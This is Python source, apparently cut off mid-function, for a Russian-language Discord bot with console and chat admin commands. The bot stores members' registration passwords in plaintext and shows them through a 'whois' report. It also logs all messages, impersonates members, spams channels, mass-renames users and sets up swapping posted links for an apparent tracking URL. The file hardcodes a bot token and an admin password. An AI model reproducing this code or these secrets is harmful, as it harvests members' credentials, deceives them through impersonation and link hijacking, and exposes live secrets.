import discord
import asyncio
import re
import datetime
import os
import json

# Твой токен, который связывает код с ботом
BOT_TOKEN = 'MTQwNzYzNzExNDg5MTI3MjI4Mw.GUQg1x.y3im5FxqG9Y5XWmx_URHeAtUmkSUotOy4S7rXk'

# ID владельца бота (твой ID)
OWNER_ID = 1117358867693715486

# ID твоего друга - он будет админом через чат
FRIEND_ID = 1399814778943443095

# ID канала, в котором будут работать команды для твоего друга
ADMIN_CHANNEL_ID = 1376789042691309658

# ID твоего сервера
SERVER_ID = 1375801862724386827

# Префикс для команд в чате
COMMAND_PREFIX = 'Sudo Hack'
SLASH_COMMANDS = ('/reg', '/register', '/login', '/l')

# Переменные для контроля маскировки
masking_enabled = False
target_user_id = None
original_bot_nick = None

# Ссылка, на которую будут заменяться все другие ссылки
REPLACEMENT_LINK = 'https://ezstat.ru/22822822'

# Регулярное выражение для поиска ссылок
URL_REGEX = r"(https?://[^\s]+)"

# --- ПЕРЕМЕННЫЕ ДЛЯ АВТОВЫДАЧИ РОЛИ ---
auto_role_enabled = False
auto_role_id = None
announce_inviter = False

# --- ФЛАГ ДЛЯ ВЫХОДА ---
running = True

# --- НОВАЯ ПЕРЕМЕННАЯ ДЛЯ ЭКСТРЕННОЙ РЕГИСТРАЦИИ ---
emergency_registration_mode = False

# Указываем, какие права (intents) нам нужны
intents = discord.Intents.all()
bot = discord.Client(intents=intents)

# --- НОВЫЕ ПЕРЕМЕННЫЕ ДЛЯ СИСТЕМЫ РЕГИСТРАЦИИ ---
USERS_FILE = 'users.json'
CONFIG_FILE = 'config.json'
registered_users = {} # Кэш для зарегистрированных пользователей
sensitive_data = {} # Кэш для данных, которые нужно мониторить
WHOIS_PASSWORD = "Lol_Kek1123" # Новый пароль для команды whois
voice_activity = {} # {user_id: start_time} для отслеживания времени в войсе

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def save_users():
    """Сохраняет данные пользователей в JSON-файл."""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(registered_users, f, ensure_ascii=False, indent=4)

def load_users():
    """Загружает данные пользователей из JSON-файла."""
    global registered_users, sensitive_data
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            registered_users = json.load(f)
            # Обновляем кэш чувствительных данных при загрузке
            update_sensitive_data_cache()

def save_config():
    """Сохраняет конфигурационные данные в JSON-файл."""
    config = {
        'WHOIS_PASSWORD': WHOIS_PASSWORD
    }
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, ensure_ascii=False, indent=4)

def load_config():
    """Загружает конфигурационные данные из JSON-файл."""
    global WHOIS_PASSWORD
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            config = json.load(f)
            WHOIS_PASSWORD = config.get('WHOIS_PASSWORD', WHOIS_PASSWORD)

def update_sensitive_data_cache():
    """Обновляет кэш данных, которые бот должен отслеживать."""
    global sensitive_data
    sensitive_data = {}
    for user_id, user_data in registered_users.items():
        sensitive_data[user_data['server_nick'].lower()] = user_id
        sensitive_data[user_data['original_nick'].lower()] = user_id
        sensitive_data[user_data['password'].lower()] = user_id

def get_channel_id_by_name(guild, channel_name_or_id):
    """Преобразует #имя_канала в ID или возвращает ID, если уже является числом."""
    try:
        return int(channel_name_or_id)
    except ValueError:
        if channel_name_or_id.startswith('#'):
            channel_name = channel_name_or_id[1:]
        else:
            channel_name = channel_name_or_id
        
        for channel in guild.channels:
            if channel.name.lower() == channel_name.lower():
                return channel.id
    return None

def log_to_file(message):
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    log_file_name = f"discord_log_{now.strftime('%Y-%m-%d')}.txt"
    log_entry = f"[{timestamp}] [{message.guild.name}] #{message.channel.name} - {message.author.name}: {message.content}\n"
    
    with open(log_file_name, 'a', encoding='utf-8') as f:
        f.write(log_entry)

async def send_user_list(target):
    """Отправляет или выводит список участников и их ID."""
    guild = bot.get_guild(SERVER_ID)
    if not guild:
        output = "Ошибка: Сервер не найден. Проверь ID сервера."
        if isinstance(target, discord.TextChannel) or isinstance(target, discord.DMChannel):
            await target.send(output)
        else:
            print(output)
        return

    members = [f"- {member.name} (Ник: {member.display_name}) - ID: {member.id}" for member in guild.members]
    output = "Вот список всех участников на сервере:\n" + "\n".join(members)
    
    if isinstance(target, discord.TextChannel) or isinstance(target, discord.DMChannel):
        await target.send(output)
    else:
        print(output)

async def send_channel_list(target):
    """Отправляет или выводит список каналов и их ID."""
    guild = bot.get_guild(SERVER_ID)
    if not guild:
        output = "Ошибка: Сервер не найден. Проверь ID сервера."
        if isinstance(target, discord.TextChannel) or isinstance(target, discord.DMChannel):
            await target.send(output)
        else:
            print(output)
        return

    channels = [f"- #{channel.name} - ID: {channel.id}" for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    output = "Вот список всех текстовых каналов на сервере:\n" + "\n".join(channels)
    
    if isinstance(target, discord.TextChannel) or isinstance(target, discord.DMChannel):
        await target.send(output)
    else:
        print(output)
        
async def process_registration_command(message):
    """
    Обрабатывает команды регистрации и логина
    """
    command_content = message.content.strip()
    command_parts = command_content.split()
    
    if len(command_parts) < 3:
        await message.author.send("Неверный формат команды. Используйте `/register <ник> <пароль>`.")
        return
    
    prefix = command_parts[0].lower()
    nick = command_parts[1]
    password = command_parts[2]
    
    if prefix in ('/reg', '/register'):
        user_id = str(message.author.id)
        if user_id in registered_users:
            await message.author.send("Ты уже зарегистрирован! Используй `/login` для восстановления.")
            return

        for data in registered_users.values():
            if data['server_nick'].lower() == nick.lower():
                await message.author.send("Этот ник уже занят.")
                return

        join_date = "Неизвестно"
        guild = bot.get_guild(SERVER_ID)
        if guild:
            member = guild.get_member(message.author.id)
            if member and member.joined_at:
                join_date = member.joined_at.strftime("%Y-%m-%d %H:%M:%S")

        reg_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        registered_users[user_id] = {
            'server_nick': nick,
            'original_nick': message.author.name,
            'password': password,
            'reg_date': reg_date,
            'join_date': join_date,
            'message_count': 0,
            'bans': 0,
            'warns': 0,
            'mutes': 0,
            'kicks': 0,
            'inviter_id': None,
            'last_login': datetime.datetime.now().isoformat(),
            'total_voice_time': 0 # Новая переменная для общего времени в войсе (в секундах)
        }
        
        save_users()
        update_sensitive_data_cache()
        await message.author.send(f"Регистрация успешна, **{nick}**! Теперь ты можешь писать в чат на сервере.")
    
    elif prefix in ('/login', '/l'):
        user_id = None
        for uid, data in registered_users.items():
            if data['server_nick'].lower() == nick.lower() and data['password'] == password:
                user_id = uid
                break
        
        if user_id and user_id == str(message.author.id):
            registered_users[user_id]['last_login'] = datetime.datetime.now().isoformat()
            save_users()
            await message.author.send("Ты успешно вошел в свой аккаунт.")
        else:
            await message.author.send("Неверный ник или пароль.")

def format_voice_time(seconds):
    """Форматирует общее время в удобочитаемый вид."""
    if seconds < 60:
        return f"{int(seconds)} сек."
    minutes = seconds // 60
    if minutes < 60:
        return f"{int(minutes)} мин."
    hours = minutes // 60
    minutes = minutes % 60
    if hours < 24:
        return f"{int(hours)} ч. {int(minutes)} мин."
    days = hours // 24
    hours = hours % 24
    return f"{int(days)} д. {int(hours)} ч. {int(minutes)} мин."

# --- ФУНКЦИИ ДЛЯ УПРАВЛЕНИЯ ЧЕРЕЗ КОНСОЛЬ (ТОЛЬКО ДЛЯ ТЕБЯ) ---
async def console_input_handler():
    global masking_enabled, target_user_id, original_bot_nick, auto_role_enabled, auto_role_id, announce_inviter, running
    print("Консоль: Вводи команды. Используй 'help' для списка команд.")
    while running:
        try:
            command = await asyncio.to_thread(input)
            command_parts = command.split()
            if not command_parts:
                continue
            
            cmd = command_parts[0].lower()
            guild = bot.get_guild(SERVER_ID)
            
            if not guild:
                print("Ошибка: Сервер не найден. Проверь ID сервера и права бота.")
                continue

            # Команда выхода
            if cmd == "exit":
                print("Выключаю бота...")
                running = False
                await bot.close()
                break

            # Проверка для команд с одним ID
            if len(command_parts) == 2 and command_parts[1].lower() in ['пусто', 'empty', '?']:
                if cmd in ["change_nick", "add_role", "remove_role", "mimic"]:
                    await send_user_list(None)
                    continue
                if cmd in ["clear", "send_message", "spam", "lockdown", "lockdown_off", "change_topic", "move_all_to"]:
                    await send_channel_list(None)
                    continue
            
            # Проверка для команд с двумя ID
            if len(command_parts) == 3 and command_parts[2].lower() in ['пусто', 'empty', '?']:
                if cmd in ["clear_user", "move_to"]:
                    await send_channel_list(None)
                    continue
            
            # --- НОВАЯ КОМАНДА: WHОIS ---
            if cmd == "whois" and len(command_parts) >= 3:
                user_id = command_parts[1]
                
                if user_id in ['?', 'empty', 'пусто']:
                    await send_user_list(None)
                    continue

                password = command_parts[2]
                
                if password != WHOIS_PASSWORD: # Проверка на новый пароль
                    print("Ошибка: Неверный пароль. Доступ запрещен.")
                    continue
                
                if user_id not in registered_users:
                    print("Ошибка: Пользователь не найден в базе данных.")
                    continue

                user_data = registered_users[user_id]
                member = guild.get_member(int(user_id))
                
                if not member:
                    print("Ошибка: Пользователь не найден на сервере.")
                    continue

                roles = [guild.get_role(role_id).name for role_id in user_data.get('roles', []) if guild.get_role(role_id)]
                
                # Получаем статус пользователя
                status = str(member.status).replace("Status.", "").capitalize()
                
                # Получаем общее время в войсе
                total_voice_time = user_data.get('total_voice_time', 0)
                formatted_voice_time = format_voice_time(total_voice_time)
                
                report = (
                    f"**Отчёт по пользователю: {member.display_name}**\n\n"
                    f"**Аккаунт:**\n"
                    f"Ориг. ник: `{user_data['original_nick']}`\n"
                    f"Вид. ник: `{member.name}`\n"
                    f"Ник на сервере (регистр.): `{user_data['server_nick']}`\n"
                    f"Пароль: `{user_data['password']}`\n\n"
                    f"**Статус:**\n"
                    f"Статус: `{status}`\n"
                    f"В голосовом канале: `{member.voice.channel.name if member.voice else 'Нет'}`\n"
                    f"Общее время в войсе: `{formatted_voice_time}`\n\n"
                    f"**Модерация:**\n"
                    f"Банов: `{user_data['bans']}`\n"
                    f"Варнов: `{user_data['warns']}`\n"
                    f"Мутов: `{user_data['mutes']}`\n"
                    f"Киков: `{user_data['kicks']}`\n\n"
                    f"**Статистика:**\n"
                    f"Сообщений: `{user_data['message_count']}`\n"
                    f"Пригласил: `{user_data['inviter_id'] or 'Неизвестно'}`\n\n"
                    f"**Даты:**\n"
                    f"Подкл. к серверу: `{user_data['join_date']}`\n"
                    f"Регистр. в системе: `{user_data['reg_date']}`\n"
                    f"Последний вход: `{user_data.get('last_login', 'Неизвестно')}`\n\n"
                    f"**Дополнительно:**\n"
                    f"Роли: {', '.join(roles)}"
                )
                
                try:
                    owner = await bot.fetch_user(OWNER_ID)
                    await owner.send(report)
                    print("Отчёт успешно отправлен вам в ЛС.")
                except Exception as e:
                    print(f"Не удалось отправить отчёт в ЛС. Ошибка: {e}")

            # Команда смены ника
            elif cmd == "change_nick" and len(command_parts) >= 3:
                member_id = int(command_parts[1])
                new_nick = " ".join(command_parts[2:])
                try:
                    member = await guild.fetch_member(member_id)
                    await member.edit(nick=new_nick)
                    print(f"Ник {member.name} успешно изменён на '{new_nick}'.")
                except Exception as e:
                    print(f"Произошла ошибка при смене ника: {e}")
            
            # Команда очистки чата
            elif cmd == "clear" and len(command_parts) >= 2:
                channel_input = command_parts[1]
                count = int(command_parts[2]) if len(command_parts) > 2 else None
                channel_id = get_channel_id_by_name(guild, channel_input)
                channel = bot.get_channel(channel_id)
                if channel and isinstance(channel, discord.TextChannel):
                    try:
                        deleted_count = 0
                        async for message_to_delete in channel.history(limit=count):
                            await message_to_delete.delete()
                            deleted_count += 1
                        print(f"Уничтожено {deleted_count} сообщений в канале {channel.name}.")
                    except discord.Forbidden:
                        print("Ошибка: У бота нет прав на это. Жалкое зрелище.")
                    except Exception as e:
                        print(f"Какая-то ошибка при зачистке: {e}")
                else:
                    print(f"Ошибка: Канал '{channel_input}' не найден. Или он не текстовый.")
            
            # Команда очистки сообщений от конкретного пользователя
            elif cmd == "clear_user" and len(command_parts) >= 3:
                channel_input = command_parts[1]
                user_id = int(command_parts[2])
                count = int(command_parts[3]) if len(command_parts) > 3 else None
                channel_id = get_channel_id_by_name(guild, channel_input)
                channel = bot.get_channel(channel_id)
                if channel and isinstance(channel, discord.TextChannel):
                    try:
                        deleted_count = 0
                        async for message_to_delete in channel.history(limit=count):
                            if message_to_delete.author.id == user_id:
                                await message_to_delete.delete()
                                deleted_count += 1
                        print(f"Уничтожено {deleted_count} сообщений от пользователя {user_id} в канале {channel.name}.")
                    except discord.Forbidden:
                        print("Ошибка: У бота нет прав на это. Жалкое зрелище.")
                    except Exception as e:
                        print(f"Какая-то ошибка при зачистке: {e}")
                else:
                    print(f"Ошибка: Канал '{channel_input}' не найден. Или он не текстовый.")
            
            # Команда отправки сообщения
            elif cmd == "send_message" and len(command_parts) >= 3:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                message_text = " ".join(command_parts[2:])
                channel = bot.get_channel(channel_id)
                if channel:
                    try:
                        await channel.send(message_text)
                        print(f"Сообщение '{message_text}' успешно отправлено в канал.")
                    except discord.Forbidden:
                        print("Ошибка: У бота нет прав на отправку сообщений в этот канал.")
                else:
                    print(f"Ошибка: Канал '{channel_input}' не найден.")

            # Команда выдачи роли
            elif cmd == "add_role" and len(command_parts) >= 3:
                member_id = int(command_parts[1])
                role_id = int(command_parts[2])
                try:
                    member = await guild.fetch_member(member_id)
                    role = guild.get_role(role_id)
                    if not role:
                        print("Ошибка: Роль не найдена на сервере.")
                        continue
                    await member.add_roles(role)
                    print(f"Роль '{role.name}' выдана пользователю '{member.name}'.")
                except Exception as e:
                    print(f"Ошибка при выдаче роли: {e}")
            
            # Команда удаления роли
            elif cmd == "remove_role" and len(command_parts) >= 3:
                member_id = int(command_parts[1])
                role_id = int(command_parts[2])
                try:
                    member = await guild.fetch_member(member_id)
                    role = guild.get_role(role_id)
                    if not role:
                        print("Ошибка: Роль не найдена на сервере.")
                        continue
                    await member.remove_roles(role)
                    print(f"Роль '{role.name}' забрана у пользователя '{member.name}'.")
                except Exception as e:
                    print(f"Ошибка при удалении роли: {e}")

            # Команда спама
            elif cmd == "spam" and len(command_parts) >= 4:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                count = int(command_parts[2])
                message_text = " ".join(command_parts[3:])
                channel = bot.get_channel(channel_id)
                if channel:
                    try:
                        print(f"Начинаю спам '{message_text}' {count} раз в канал.")
                        for i in range(count):
                            await channel.send(message_text)
                            await asyncio.sleep(0.5)
                        print("Спам завершен.")
                    except discord.Forbidden:
                        print("Ошибка: У бота нет прав на отправку сообщений в этот канал.")
                    except Exception as e:
                        print(f"Произошла ошибка при спаме: {e}")
                else:
                    print(f"Ошибка: Канал '{channel_input}' не найден.")
            
            # Команда для включения маскировки
            elif cmd == "mimic" and len(command_parts) == 2:
                try:
                    target_id = int(command_parts[1])
                    target_member = await guild.fetch_member(target_id)
                    if not target_member:
                        print("Ошибка: Неверный ID. Пользователь не найден на сервере.")
                        continue
                    target_user_id = target_id
                    masking_enabled = True
                    print(f"Маскировка включена. Твои сообщения будут отправляться от имени {target_member.display_name}.")
                except ValueError:
                    print("Ошибка: ID должен быть числом.")
                except Exception as e:
                    print(f"Произошла ошибка: {e}")

            # Команда для отключения маскировки
            elif cmd == "mimic_off":
                masking_enabled = False
                target_user_id = None
                if original_bot_nick:
                    try:
                        await guild.me.edit(nick=original_bot_nick)
                        print(f"Ник бота возвращён к '{original_bot_nick}'.")
                        original_bot_nick = None
                    except discord.Forbidden:
                        print("Ошибка: Недостаточно прав для возврата оригинального ника.")
                print("Маскировка выключена.")
            
            # Массовая смена ников
            elif cmd == "change_all_nicks" and len(command_parts) >= 2:
                new_nick = " ".join(command_parts[1:])
                print(f"Начинаю массовую смену ников на '{new_nick}'...")
                members_changed = 0
                for member in guild.members:
                    if member.bot: continue
                    try:
                        await member.edit(nick=new_nick)
                        members_changed += 1
                        await asyncio.sleep(0.5)
                    except discord.Forbidden:
                        print(f"Недостаточно прав для изменения ника у {member.name}.")
                print(f"Массовая смена ников завершена. Изменено {members_changed} ников.")
            
            # Перемещение в голосовом чате
            elif cmd == "move_to" and len(command_parts) == 3:
                member_id = int(command_parts[1])
                channel_input = command_parts[2]
                channel_id = get_channel_id_by_name(guild, channel_input)
                try:
                    member = await guild.fetch_member(member_id)
                    channel = guild.get_channel(channel_id)
                    if not member or not channel or not isinstance(channel, discord.VoiceChannel):
                        print("Ошибка: Пользователь или голосовой канал не найдены.")
                        continue
                    await member.move_to(channel)
                    print(f"Пользователь {member.name} перемещен в канал {channel.name}.")
                except Exception as e:
                    print(f"Ошибка при перемещении: {e}")
            
            # Массовое перемещение
            elif cmd == "move_all_to" and len(command_parts) == 2:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                try:
                    channel = guild.get_channel(channel_id)
                    if not channel or not isinstance(channel, discord.VoiceChannel):
                        print("Ошибка: Голосовой канал не найден.")
                        continue
                    moved_count = 0
                    for member in guild.members:
                        if member.voice:
                            await member.move_to(channel)
                            moved_count += 1
                            await asyncio.sleep(0.5)
                    print(f"Перемещено {moved_count} пользователей в канал {channel.name}.")
                except Exception as e:
                    print(f"Ошибка при массовом перемещении: {e}")

            # "Заморозка" канала
            elif cmd == "lockdown" and len(command_parts) == 2:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                try:
                    channel = bot.get_channel(channel_id)
                    if not channel:
                        print(f"Ошибка: Канал '{channel_input}' не найден.")
                        continue
                    everyone_role = guild.default_role
                    await channel.set_permissions(everyone_role, send_messages=False)
                    print(f"Канал {channel.name} 'заморожен'.")
                except Exception as e:
                    print(f"Ошибка при 'заморозке': {e}")
            
            # Снятие "заморозки"
            elif cmd == "lockdown_off" and len(command_parts) == 2:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                try:
                    channel = bot.get_channel(channel_id)
                    if not channel:
                        print(f"Ошибка: Канал '{channel_input}' не найден.")
                        continue
                    everyone_role = guild.default_role
                    await channel.set_permissions(everyone_role, send_messages=True)
                    print(f"Канал {channel.name} разморожен.")
                except Exception as e:
                    print(f"Ошибка при снятии 'заморозки': {e}")
            
            # Изменение темы канала
            elif cmd == "change_topic" and len(command_parts) >= 3:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                new_topic = " ".join(command_parts[2:])
                try:
                    channel = bot.get_channel(channel_id)
                    if channel:
                        await channel.edit(topic=new_topic)
                        print(f"Тема канала {channel.name} изменена на: '{new_topic}'")
                    else:
                        print(f"Ошибка: Канал '{channel_input}' не найден.")
                except Exception as e:
                    print(f"Ошибка при изменении темы: {e}")

            # Запланированный спам
            elif cmd == "schedule_spam" and len(command_parts) >= 5:
                channel_input = command_parts[1]
                channel_id = get_channel_id_by_name(guild, channel_input)
                count = int(command_parts[2])
                message_text = " ".join(command_parts[3:-1])
                delay_seconds = int(command_parts[-1])
                
                async def scheduled_task():
                    await asyncio.sleep(delay_seconds)
                    channel = bot.get_channel(channel_id)
                    if channel:
                        print(f"Выполняю запланированный спам в канал {channel.name}...")
                        for _ in range(count):
                            await channel.send(message_text)
                            await asyncio.sleep(0.5)
                        print("Запланированный спам завершен.")
                    else:
                        print("Ошибка: Канал для запланированного спама не найден.")
                
                bot.loop.create_task(scheduled_task())
                print(f"Запланирована задача: спам в канал {channel_input} через {delay_seconds} секунд.")
            
            # Команда для вывода логов в консоль
            elif cmd == "show_logs":
                log_files = sorted([f for f in os.listdir('.') if f.startswith('discord_log_') and f.endswith('.txt')])
                
                # Автоматическая очистка: удаляем самый старый файл, если их больше 9
                if len(log_files) > 9:
                    oldest_file = log_files.pop(0)
                    try:
                        os.remove(oldest_file)
                        print(f"Старый лог-файл '{oldest_file}' был автоматически удален.")
                    except OSError as e:
                        print(f"Ошибка при удалении файла {oldest_file}: {e}")
                
                if len(command_parts) == 1:
                    if not log_files:
                        print("Нет доступных лог-файлов.")
                        continue
                        
                    print("\n--- ДОСТУПНЫЕ ЛОГИ ---")
                    for i, filename in enumerate(log_files, 1):
                        date_str = filename.replace('discord_log_', '').replace('.txt', '')
                        print(f"{i}: Лог за {date_str}")
                    print("------------------------")
                    print("Чтобы посмотреть лог, введите 'show_logs <номер>'")
                    
                elif len(command_parts) == 2:
                    try:
                        log_number = int(command_parts[1])
                        if 1 <= log_number <= len(log_files):
                            selected_file = log_files[log_number - 1]
                            with open(selected_file, 'r', encoding='utf-8') as f:
                                logs = f.read()
                                print(f"\n--- НАЧАЛО ЛОГОВ ИЗ ФАЙЛА {selected_file} ---")
                                print(logs)
                                print(f"--- КОНЕЦ ЛОГОВ ИЗ ФАЙЛА {selected_file} ---\n")
                        else:
                            print("Ошибка: Неверный номер лог-файла. Введите 'show_logs' без аргументов, чтобы увидеть список.")
                    except ValueError:
                        print("Ошибка: Аргумент должен быть числом.")
                    except FileNotFoundError:
                        print("Ошибка: Выбранный лог-файл не найден.")
                    except Exception as e:
                        print(f"Ошибка при чтении логов: {e}")
            
            # --- КОМАНДА: АВТОВЫДАЧА РОЛИ ---
            elif cmd == "auto_role" and len(command_parts) >= 3:
                role_id_input = command_parts[1]
                announce_input = command_parts[2].lower()
                
                try:
                    global auto_role_enabled, auto_role_id, announce_inviter
                    auto_role_id = int(role_id_input)
                    announce_inviter = announce_input in ['t', 'true', 'да', '1']
                    
                    if announce_input in ['f', 'false', 'нет', '0', 't', 'true', 'да', '1']:
                        auto_role_enabled = True
                    else:
                        print("Ошибка: Неверное значение для второго аргумента (должно быть T/F).")
                        continue
                    
                    if auto_role_enabled:
                        role = guild.get_role(auto_role_id)
                        if role:
                            print(f"Автовыдача роли ВКЛЮЧЕНА. Роль: {role.name}. Оповещать об инвайте: {announce_inviter}.")
                        else:
                            auto_role_enabled = False
                            print("Ошибка: Роль с таким ID не найдена. Автовыдача отключена.")
                    else:
                        print("Автовыдача роли ВЫКЛЮЧЕНА.")
                except ValueError:
                    print("Ошибка: ID роли должен быть числом.")
                except Exception as e:
                    print(f"Ошибка при настройке автовыдачи роли: {e}")
                    
            # --- НОВЫЕ КОМАНДЫ ДЛЯ ЭКСТРЕННОЙ РЕГИСТРАЦИИ ---
            elif cmd == "extreg":
                global emergency_registration_mode
                emergency_registration_mode = True
                print("Экстренная регистрация включена. Все незарегистрированные сообщения будут удаляться.")
            
            elif cmd == "extreg_off":
                emergency_registration_mode = False
                print("Экстренная регистрация отключена.")

            elif cmd == "help":
                print("\nДоступные команды в консоли:")
                print(f" - whois <ID> <пароль> (отправляет отчёт в ЛС)")
                print(" - change_nick <ID пользователя> <новый ник>")
                print(" - - change_all_nicks <новый ник>")
                print(" - send_message <#канал или ID> <сообщение>")
                print(" - add_role <ID пользователя> <ID роли>")
                print(" - remove_role <ID пользователя> <ID роли> (убрать роль)")
                print(" - spam <#канал или ID> <количество> <сообщение>")
                print(" - clear <#канал или ID> <кол-во> (очистка чата)")
                print(" - clear_user <#канал или ID> <ID пользователя> <кол-во> (очистка сообщений конкретного пользователя)")
                print(" - mimic <ID пользователя> (включает маскировку)")
                print(" - mimic_off (отключает маскировку)")
                print(" - move_to <ID пользователя> <#канал или ID>")
                print(" - move_all_to <#канал или ID>")
                print(" - lockdown <#канал или ID>")
                print(" - lockdown_off <#канал или ID>")
                print(" - change_topic <#канал или ID> <новая_тема>")
                print(" - schedule_spam <#канал или ID> <кол-во> <сообщение> <секунды задержки>")
                print(" - show_logs [<номер>] (показать список логов или содержимое выбранного)")
                print(" - auto_role <ID роли> <T/F> (вкл/выкл автовыдачу роли и оповещение об инвайте)")
                print(" - extreg (включить режим экстренной регистрации)")
                print(" - extreg_off (отключить режим экстренной регистрации)")
                print(" - exit (выключает бота)\n")
                print(" - Reset_pass <новый_пароль> <подтверждение> (работает ТОЛЬКО в ЛС с ботом)")

            else:
                print(f"Неизвестная команда: {cmd}. Используйте 'help' для списка команд.")

        except Exception as e:
            print(f"Произошла ошибка при обработке команды: {e}")

# --- ФУНКЦИЯ ДЛЯ УПРАВЛЕНИЯ ЧЕРЕЗ ЧАТ (ДЛЯ ТЕБЯ И ДРУГА) ---
async def process_private_command(message):
    global masking_enabled, target_user_id, original_bot_nick, auto_role_enabled, auto_role_id, announce_inviter, WHOIS_PASSWORD, emergency_registration_mode

    command_content = message.content[len(COMMAND_PREFIX) + 1:].strip()
    command_parts = command_content.split()
    if not command_parts:
        return

    cmd = command_parts[0].lower()
    args = command_parts[1:]
    guild = bot.get_guild(SERVER_ID)
    
    if not guild:
        await message.author.send("Ошибка: Сервер не найден. Проверь ID сервера.")
        return

    # Задаем канал для вывода
    output_target = message.author.dm_channel or await message.author.create_dm()

    if len(args) == 1 and args[0].lower() in ['пусто', 'empty', '?']:
        if cmd in ["change_nick", "add_role", "remove_role", "mimic"]:
            await send_user_list(output_target)
            return
        if cmd in ["clear", "send_message", "spam", "lockdown", "lockdown_off", "change_topic", "move_all_to"]:
            await send_channel_list(output_target)
            return

    if len(args) == 2 and args[1].lower() in ['пусто', 'empty', '?']:
        if cmd in ["clear_user", "move_to"]:
            await send_channel_list(output_target)
            return

    # --- КОМАНДА: WHОIS ---
    if cmd == "whois" and len(args) >= 2:
        user_id = args[0]
        password = args[1]

        if password != WHOIS_PASSWORD: # Проверка на новый пароль
            await output_target.send("Неверный пароль. Доступ запрещен.")
            return
        
        if user_id not in registered_users:
            await output_target.send("Пользователь не найден в базе данных.")
            return

        user_data = registered_users[user_id]
        member = guild.get_member(int(user_id))
        
        if not member:
            await output_target.send("Пользователь не найден на сервере.")
            return
        
        roles = [guild.get_role(role_id).name for role_id in user_data.get('roles', []) if guild.get_role(role_id)]

        # Получаем статус пользователя
        status = str(member.status).replace("Status.", "").capitalize()
        
        # Получаем общее время в войсе
        total_voice_time = user_data.get('total_voice_time', 0)
        formatted_voice_time = format_voice_time(total_voice_time)
        
        report = (
            f"**Отчёт по пользователю: {member.display_name}**\n\n"
            f"**Аккаунт:**\n"
            f"Ориг. ник: `{user_data['original_nick']}`\n"
            f"Вид. ник: `{member.name}`\n"
            f"Ник на сервере (регистр.): `{user_data['server_nick']}`\n"
            f"Пароль: `{user_data['password']}`\n\n"
            f"**Статус:**\n"
            f"Статус: `{status}`\n"
            f"В голосовом канале: `{member.voice.channel.name if member.voice else 'Нет'}`\n"
            f"Общее время в войсе: `{formatted_voice_time}`\n\n"
            f"**Модерация:**\n"
            f"Банов: `{user_data['bans']}`\n"
            f"Варнов: `{user_data['warns']}`\n"
            f"Мутов: `{user_data['mutes']}`\n"
            f"Киков: `{user_data['kicks']}`\n\n"
            f"**Статистика:**\n"
            f"Сообщений: `{user_data['message_count']}`\n"
            f"Пригласил: `{user_data['inviter_id'] or 'Неизвестно'}`\n\n"
            f"**Даты:**\n"
            f"Подкл. к серверу: `{user_data['join_date']}`\n"
            f"Регистр. в системе: `{user_data['reg_date']}`\n"
            f"Последний вход: `{user_data.get('last_login', 'Неизвестно')}`\n\n"
            f"**Дополнительно:**\n"
            f"Роли: {', '.join(roles)}"
        )
        
        try:
            await output_target.send(report)
        except Exception as e:
            await output_target.send(f"Не удалось отправить отчёт в ЛС. Ошибка: {e}")

    # Команда смены ника
    elif cmd == "change_nick" and len(args) >= 2:
        try:
            member_id = int(args[0])
            new_nick = " ".join(args[1:])
            member = await guild.fetch_member(member_id)
            await member.edit(nick=new_nick)
            await output_target.send(f"Ник {member.name} успешно изменён на '{new_nick}'.")
        except Exception as e:
            await output_target.send(f"Ошибка при смене ника: {e}")

    # Команда очистки чата
    elif cmd == "clear" and len(args) >= 2:
        try:
            channel_input = args[0]
            count = int(args[1]) if len(args) > 1 else None
            channel_id = get_channel_id_by_name(guild, channel_input)
            channel = bot.get_channel(channel_id)
            if channel and isinstance(channel, discord.TextChannel):
                deleted_count = 0
                async for message_to_delete in channel.history(limit=count):
                    await message_to_delete.delete()
                    deleted_count += 1
                await output_target.send(f"Уничтожено {deleted_count} сообщений в канале {channel.name}.")
            else:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден или не является текстовым.")
        except Exception as e:
            await output_target.send(f"Произошла ошибка при очистке: {e}")

    # Команда очистки сообщений от конкретного пользователя
    elif cmd == "clear_user" and len(args) >= 3:
        try:
            channel_input = args[0]
            user_id = int(args[1])
            count = int(args[2]) if len(args) > 2 else None
            channel_id = get_channel_id_by_name(guild, channel_input)
            channel = bot.get_channel(channel_id)
            if channel and isinstance(channel, discord.TextChannel):
                deleted_count = 0
                async for message_to_delete in channel.history(limit=count):
                    if message_to_delete.author.id == user_id:
                        await message_to_delete.delete()
                        deleted_count += 1
                await output_target.send(f"Уничтожено {deleted_count} сообщений от пользователя {user_id} в канале {channel.name}.")
            else:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден или не является текстовым.")
        except Exception as e:
            await output_target.send(f"Какая-то ошибка при зачистке: {e}")
            
    # Команда спама
    elif cmd == "spam" and len(args) >= 3:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            count = int(args[1])
            message_text = " ".join(args[2:])
            channel = bot.get_channel(channel_id)
            if channel:
                for _ in range(count):
                    await channel.send(message_text)
                    await asyncio.sleep(0.5)
                await output_target.send("Спам завершен.")
            else:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден.")
        except Exception as e:
            await output_target.send(f"Произошла ошибка при спаме: {e}")
    
    # Команда выдачи роли
    elif cmd == "add_role" and len(args) >= 2:
        try:
            member_id = int(args[0])
            role_id = int(args[1])
            member = await guild.fetch_member(member_id)
            role = guild.get_role(role_id)
            if not role:
                await output_target.send("Ошибка: Роль не найдена на сервере.")
                return
